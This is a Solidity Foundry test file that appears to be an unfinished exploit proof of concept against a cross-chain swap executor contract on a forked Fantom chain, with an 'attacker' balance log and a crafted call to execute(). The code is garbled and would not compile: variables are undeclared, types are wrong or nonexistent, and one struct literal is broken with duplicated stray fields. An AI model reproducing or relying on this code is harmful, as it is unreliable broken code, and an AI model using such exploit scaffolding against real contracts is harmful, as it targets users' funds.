// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import "../test/interfaces/IERC20.sol";

interface IActionDataStructures {
    /**
     * @notice Single-chain action data structure
     * @param fromTokenAddress The address of the input token
     * @param toTokenAddress The address of the output token
     * @param swapInfo The data for the single-chain swap
     * @param recipient The address of the recipient
     */
    struct LocalAction {
        address fromTokenAddress;
        address toTokenAddress;
        SwapInfo swapInfo;
        address recipient;
    }

    /**
     * @notice Cross-chain action data structure
     * @param gatewayType The numeric type of the cross-chain gateway
     * @param vaultType The numeric type of the vault
     * @param sourceTokenAddress The address of the input token on the source chain
     * @param sourceSwapInfo The data for the source chain swap
     * @param targetChainId The action target chain ID
     * @param targetTokenAddress The address of the output token on the destination chain
     * @param targetSwapInfoOptions The list of data options for the target chain swap
     * @param targetRecipient The address of the recipient on the target chain
     * @param gatewaySettings The gateway-specific settings data
     */
    struct Action {
        uint256 gatewayType;
        uint256 vaultType;
        address sourceTokenAddress;
        SwapInfo sourceSwapInfo;
        uint256 targetChainId;
        address targetTokenAddress;
        SwapInfo[] targetSwapInfoOptions;
        address targetRecipient;
        bytes gatewaySettings;
    }

    /**
     * @notice Token swap data structure
     * @param fromAmount The quantity of the token
     * @param routerType The numeric type of the swap router
     * @param routerData The data for the swap router call
     */
    struct SwapInfo {
        uint256 fromAmount;
        uint256 routerType;
        bytes routerData;
    }

    /**
     * @notice Cross-chain message data structure
     * @param actionId The unique identifier of the cross-chain action
     * @param sourceSender The address of the sender on the source chain
     * @param vaultType The numeric type of the vault
     * @param targetTokenAddress The address of the output token on the target chain
     * @param targetSwapInfo The data for the target chain swap
     * @param targetRecipient The address of the recipient on the target chain
     */
    struct TargetMessage {
        uint256 actionId;
        address sourceSender;
        uint256 vaultType;
        address targetTokenAddress;
        SwapInfo targetSwapInfo;
        address targetRecipient;
    }
}

interface ISettings {
    /**
     * @notice Settings for a single-chain swap
     * @param router The swap router contract address
     * @param routerTransfer The swap router transfer contract address
     * @param systemFeeLocal The system fee value in milli-percent, e.g., 100 is 0.1%
     * @param feeCollectorLocal The address of the single-chain action fee collector
     * @param isWhitelist The whitelist flag
     */
    struct LocalSettings {
        address router;
        address routerTransfer;
        uint256 systemFeeLocal;
        address feeCollectorLocal;
        bool isWhitelist;
    }

    /**
     * @notice Source chain settings for a cross-chain swap
     * @param gateway The cross-chain gateway contract address
     * @param router The swap router contract address
     * @param routerTransfer The swap router transfer contract address
     * @param vault The vault contract address
     * @param sourceVaultDecimals The value of the vault decimals on the source chain
     * @param targetVaultDecimals The value of the vault decimals on the target chain
     * @param systemFee The system fee value in milli-percent, e.g., 100 is 0.1%
     * @param feeCollector The address of the cross-chain action fee collector
     * @param isWhitelist The whitelist flag
     * @param swapAmountMin The minimum cross-chain swap amount in USD, with decimals = 18
     * @param swapAmountMax The maximum cross-chain swap amount in USD, with decimals = 18
     */
    struct SourceSettings {
        address gateway;
        address router;
        address routerTransfer;
        address vault;
        uint256 sourceVaultDecimals;
        uint256 targetVaultDecimals;
        uint256 systemFee;
        address feeCollector;
        bool isWhitelist;
        uint256 swapAmountMin;
        uint256 swapAmountMax;
    }

    /**
     * @notice Target chain settings for a cross-chain swap
     * @param router The swap router contract address
     * @param routerTransfer The swap router transfer contract address
     * @param vault The vault contract address
     * @param gasReserve The target chain gas reserve value
     */
    struct TargetSettings {
        address router;
        address routerTransfer;
        address vault;
        uint256 gasReserve;
    }

    /**
     * @notice Variable balance repayment settings
     * @param vault The vault contract address
     */
    struct VariableBalanceRepaymentSettings {
        address vault;
    }

    /**
     * @notice Cross-chain message fee estimation settings
     * @param gateway The cross-chain gateway contract address
     */
    struct MessageFeeEstimateSettings {
        address gateway;
    }

    /**
     * @notice Swap result calculation settings for a single-chain swap
     * @param systemFee The system fee value in milli-percent, e.g., 100 is 0.1%
     * @param isWhitelist The whitelist flag
     */
    struct LocalAmountCalculationSettings {
        uint256 systemFeeLocal;
        bool isWhitelist;
    }

    /**
     * @notice Swap result calculation settings for a cross-chain swap
     * @param fromDecimals The value of the vault decimals on the source chain
     * @param toDecimals The value of the vault decimals on the target chain
     * @param systemFee The system fee value in milli-percent, e.g., 100 is 0.1%
     * @param isWhitelist The whitelist flag
     */
    struct VaultAmountCalculationSettings {
        uint256 fromDecimals;
        uint256 toDecimals;
        uint256 systemFee;
        bool isWhitelist;
    }
}

contract CrosschainTest is Test {


    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/fantom", 93915270);
        attk = msg.sender;

        deal(address(wftm), address(this), 10 * 10**18);
    }


    function testlend() external {
        emit log_named_decimal_uint("Attacker usbd before supply", wftm.balanceOf(address(this)), 18);
        atk();
    }

    function atk() internal {
        address fromAmount = 1 ether;
        uint256 routerType = 1;
        bytes memory routerData = abi.encodeWithSelector();
        IActionDataStructures.SwapInfo memory sourceSwapInfo = IActionDataStructures.SwapInfo({
            fromAmount: fromAmount, // Example amount of 1 ether
            routerType: routerType, // Example router type (customize this)
            routerData: routerData // Empty data for simplicity
        });

        address router = 0x00;
        address routerTransfer = 0x00;
        address vault = 0x00;
        uint256 gasReserve = 1000;
        // Define the TargetSettings structure
        ISettings.TargetSettings memory targetSettings = ISettings.TargetSettings({
            router: router, 
            routerTransfer: routerTransfer, 
            vault: vault, 
            gasReserve: gasReserve 
        });

        IActionDataStructures.targetSwapInfoOptions[] memory targetSwapInfoOptions = new IActionDataStructures.targetSwapInfoOptions[](1);
            targetSwapInfoOptions[0] = IActionDataStructures.targetSwapInfoOptions({
                fromAmount: fromAmount;

            })
            fromAmount: fromAmount, // Example amount of 1 ether
            routerType: routerType, // Example router type (customize this)
            routerData: routerData // Empty data for simplicity
        });

        uint256 gatewayType = 1;
        uint256 vaultType = 1;
        address sourceTokenAddress = 0x000;
        uint256 targetChainId = 345;
        address targetTokenAddress = 0x00;
        address targetRecipient = address(this);

        IActionDataStructures.Action memory action = IActionDataStructures.Action({
            gatewayType: gatewayType, // Example gateway type (customize as needed)
            vaultType: vaultType, // Example vault type (customize as needed)
            sourceTokenAddress: sourceTokenAddress, // Example source token address (Native token)
            sourceSwapInfo: sourceSwapInfo,
            targetChainId: targetChainId, // Example target chain ID (Polygon)
            targetTokenAddress: targetTokenAddress, // Example target token address
            targetSwapInfoOptions: targetSwapInfoOptions,
            targetRecipient: targetRecipient,
            gatewaySettings: new bytes(0)
        });

        // Call the execute function on the executor contract
        (bool success, ) = executor.call{value: 1 ether}(
            abi.encodeWithSignature(
                "execute((uint256,uint256,address,(uint256,uint256,bytes),uint256,address,(uint256,uint256,bytes)[],address,bytes))",
                action
            )
        );

        require(success, "Execution failed");
    }
       
        
}